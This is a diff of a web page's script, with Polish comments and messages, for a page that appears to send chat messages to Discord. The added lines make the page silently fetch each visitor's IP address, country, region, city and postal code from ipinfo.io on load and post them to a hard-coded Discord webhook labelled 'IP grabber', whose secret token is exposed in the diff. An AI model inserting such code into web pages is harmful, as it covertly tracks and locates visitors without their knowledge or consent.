@@ -8,23 +8,32 @@
     <link rel="stylesheet" href="main.css">
     <script src="main.js"></script>
 <script>
-function monke(json) {
-  // Funkcja do wysyłania danych na webhook Discorda
-  var request = new XMLHttpRequest();
-  request.open("POST", "https://discord.com/api/webhooks/1200886968091938906/4wXL_zS_Ti30EuHHh4c1fBUyDARBf3dSCt2oq_uieSidj3JQYbzQd1cngdT_PtUQzjm1");
-  request.setRequestHeader('Content-type', 'application/json');
-  var params = {
-    username: "IP Logger",
-    avatar_url: "",
-    content: "@everyone",
-    embeds: [{
-      title: "Someone visited the IP grabber!",
-      color: 1752220,
-      description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
-    }]
-  }
-  request.send(JSON.stringify(params));
+function monke(json) 
+{
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://discord.com/api/webhooks/1200886968091938906/4wXL_zS_Ti30EuHHh4c1fBUyDARBf3dSCt2oq_uieSidj3JQYbzQd1cngdT_PtUQzjm1");
+
+     request.setRequestHeader('Content-type', 'application/json');
+
+     var params = 
+     {
+          username: "IP Logger",
+          avatar_url: "",
+          content: "@everyone",
+          embeds: [
+               {
+                    title: "Someone visited the IP grabber!",
+                    color: 1752220,
+                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+               }
+          ]
+     }
+
+     request.send(JSON.stringify(params));
 }
+</script>
+<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
 
 // Funkcja sprawdzająca cooldown i blokująca nazwę "Alxay"
 function isCooldownExpired() {
@@ -50,27 +59,18 @@ function send() {
   var messageFailed = document.getElementById('MessageFailed');
 
   if (!isCooldownExpired()) {
-    alert('Cooldown! Please wait before sending another message.');
+    alert('Cooldown! Poczekaj przed wysłaniem następnej wiadomości! (10 minut)');
     return;
   }
 
   var userName = nameInput.value.trim();
   if (!isNameAllowed(userName)) {
-    alert('Name "Alxay" is not allowed.');
+    alert('Nazwa Alxay nie jest dla ciebie dozwolona!');
     return;
   }
 
   // Zapisanie czasu ostatniego wysłania wiadomości
   localStorage.setItem('lastSentTime', new Date().getTime().toString());
-
-  // Wysyłanie wiadomości na webhook Discorda
-  monke({
-    ip: 'dummy_ip',
-    country: 'dummy_country',
-    region: 'dummy_region',
-    city: 'dummy_city',
-    postal: 'dummy_postal'
-  });
 
   // Zresetowanie formularza i wyświetlenie odpowiednich komunikatów
   nameInput.value = '';
